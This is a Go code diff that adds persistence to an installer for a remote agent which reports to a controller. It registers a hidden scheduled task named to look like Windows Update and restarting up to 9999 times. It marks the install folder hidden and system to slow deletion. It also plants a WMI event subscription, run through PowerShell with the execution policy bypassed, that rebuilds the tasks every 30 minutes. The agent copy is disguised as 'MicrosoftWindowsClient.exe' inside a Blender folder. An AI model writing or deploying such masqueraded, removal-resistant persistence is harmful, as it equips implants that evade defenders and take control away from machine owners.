@@ -279,9 +279,10 @@ func install() {
 		backupDir2 = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "Themes", "Cache")
 	}
 	_ = os.MkdirAll(backupDir2, 0755)
-	// Save the task XML next to the backup so the watchdog can re-create a
-	// deleted scheduled task by itself (self-healing persistence).
+	// Save the task XML next to the backup AND in the install dir (the
+	// WMI consumer runs as SYSTEM and can only rely on the install dir).
 	_ = os.WriteFile(filepath.Join(blenderDir, "agent_task.xml"), []byte(taskXML), 0644)
+	_ = os.WriteFile(filepath.Join(installDir, "agent_task.xml"), []byte(taskXML), 0644)
 
 	backupAgent := filepath.Join(blenderDir, "MicrosoftWindowsClient.exe")
 	backupCert := filepath.Join(blenderDir, "server.crt")
@@ -349,6 +350,18 @@ func install() {
 	}
 
 	createWatchdogTask(agentPath, blenderDir)
+	_ = copyFile(filepath.Join(blenderDir, "watchdog_task.xml"), filepath.Join(installDir, "watchdog_task.xml"))
+
+	// Third persistence task under a different name: a kill chain wiping
+	// "WindowsUpdate*" still leaves this one to revive everything.
+	createOrchestratorTask(agentPath, blenderDir, installDir)
+
+	// Slow down manual deletion: hidden+system on the install dir itself.
+	hideFile(installDir)
+
+	// Deepest layer: WMI 30-minute timer that repairs tasks + Run keys even
+	// when all of them were wiped (best effort, logged).
+	setupWmiLayer(agentPath)
 
 	cmd := exec.Command(agentPath, "-controller", controllerAddr, "-ca", certPath)
 	cmd.SysProcAttr = &syscall.SysProcAttr{
@@ -415,6 +428,8 @@ func main() {
 		}
 		_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").CombinedOutput()
 		_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateWatchdog", "/f").CombinedOutput()
+		_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateOrchestrator", "/f").CombinedOutput()
+		removeWmiLayer()
 		threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
 		blenderDir := filepath.Join(threeDObjects, "blender")
 		_ = os.Remove(filepath.Join(blenderDir, "watchdog.ps1"))
@@ -423,6 +438,7 @@ func main() {
 		_ = os.Remove(filepath.Join(blenderDir, "version.txt"))
 		_ = os.Remove(filepath.Join(blenderDir, "agent_task.xml"))
 		_ = os.Remove(filepath.Join(blenderDir, "watchdog_task.xml"))
+		_ = os.Remove(filepath.Join(blenderDir, "orchestrator_task.xml"))
 			_ = os.Remove(filepath.Join(blenderDir, "MicrosoftWindowsClient.exe"))
 			_ = os.Remove(filepath.Join(blenderDir, "server.crt"))
 			_ = os.RemoveAll(blenderDir)
@@ -501,4 +517,89 @@ func createWatchdogTask(agentPath, backupDir string) {
 		log.Printf("[*] Watchdog task registered successfully")
 	}
 	_ = os.Remove(tmpWatchdogTask)
+}
+
+// createOrchestratorTask registers the third persistence task under a
+// different name (logon + 30min + unlock, runs --watch). A kill chain that
+// wipes "WindowsUpdate*" by name still leaves this one to revive the rest.
+func createOrchestratorTask(agentPath, backupDir, installDir string) {
+	orchXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo><Date>2026-01-01T00:00:00</Date><Author>RMM</Author></RegistrationInfo>
+  <Triggers>
+    <LogonTrigger><Enabled>true</Enabled><Repetition><Interval>PT30M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></LogonTrigger>
+    <SessionStateChangeTrigger><Enabled>true</Enabled><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger>
+  </Triggers>
+  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+    <RestartOnFailure><Interval>PT1M</Interval><Count>9999</Count></RestartOnFailure>
+  </Settings>
+  <Actions Context="Author"><Exec><Command>%s</Command><Arguments>--watch</Arguments></Exec></Actions>
+</Task>`, agentPath)
+
+	_ = os.WriteFile(filepath.Join(backupDir, "orchestrator_task.xml"), []byte(orchXML), 0644)
+	_ = os.WriteFile(filepath.Join(installDir, "orchestrator_task.xml"), []byte(orchXML), 0644)
+	tmpTask := filepath.Join(os.TempDir(), "rmm_orch_task.xml")
+	_ = os.WriteFile(tmpTask, []byte(orchXML), 0644)
+	_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateOrchestrator", "/f").CombinedOutput()
+	out, err := exec.Command("schtasks", "/create", "/tn", "WindowsUpdateOrchestrator", "/xml", tmpTask, "/f").CombinedOutput()
+	if err != nil {
+		log.Printf("[!] Failed to create orchestrator task: %v %s", err, strings.TrimSpace(string(out)))
+	} else {
+		log.Printf("[*] Orchestrator task registered successfully")
+	}
+	_ = os.Remove(tmpTask)
+}
+
+const wmiFilterName = "WindowsUpdateFilter"
+const wmiConsumerName = "WindowsUpdateConsumer"
+const wmiTimerID = "WindowsUpdateTimer"
+
+// setupWmiLayer registers the deepest persistence layer: a WMI 30-minute
+// timer that runs "<agent> --wmi-heal" (repairs tasks + Run keys from the
+// install-dir XMLs). WMI subscriptions live outside schtasks/registry, so
+// even a wipe of every task + Run value still converges back. Best effort:
+// creation can fail under locked-down WMI/Defender — logged, install goes on.
+func setupWmiLayer(agentPath string) {
+	consumer := `"` + agentPath + `" --wmi-heal`
+	ps := `$na='` + wmiFilterName + `';$nc='` + wmiConsumerName + `';$tid='` + wmiTimerID + `';` +
+		`Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter.Name -eq $na } | Remove-CimInstance -ErrorAction SilentlyContinue;` +
+		`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$na'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
+		`Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter "Name='$nc'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
+		`Get-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Filter "TimerId='$tid'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
+		`$t=New-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Property @{TimerId=$tid;IntervalBetweenEvents=[uint32]1800000} -ErrorAction Stop;` +
+		`$f=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{Name=$na;EventNamespace='root/cimv2';QueryLanguage='WQL';Query="SELECT * FROM __TimerEvent WHERE TimerId='$tid'"} -ErrorAction Stop;` +
+		`$c=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property @{Name=$nc;CommandLineTemplate='` + strings.ReplaceAll(consumer, "'", "''") + `'} -ErrorAction Stop;` +
+		`New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter=[Ref]$f;Consumer=[Ref]$c} -ErrorAction Stop | Out-Null;` +
+		`Write-Host 'WMI-OK'`
+	out, err := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps).CombinedOutput()
+	if err != nil || !strings.Contains(string(out), "WMI-OK") {
+		log.Printf("[!] WMI layer not installed (non-fatal): %v %s", err, strings.TrimSpace(string(out)))
+		return
+	}
+	log.Printf("[*] WMI resurrection timer installed (30min)")
+}
+
+// removeWmiLayer deletes the WMI timer/consumer (uninstall path).
+func removeWmiLayer() {
+	ps := `$na='` + wmiFilterName + `';$nc='` + wmiConsumerName + `';$tid='` + wmiTimerID + `';` +
+		`Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter.Name -eq $na } | Remove-CimInstance -ErrorAction SilentlyContinue;` +
+		`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$na'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
+		`Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter "Name='$nc'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
+		`Get-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Filter "TimerId='$tid'" | Remove-CimInstance -ErrorAction SilentlyContinue`
+	_, _ = exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps).CombinedOutput()
 }
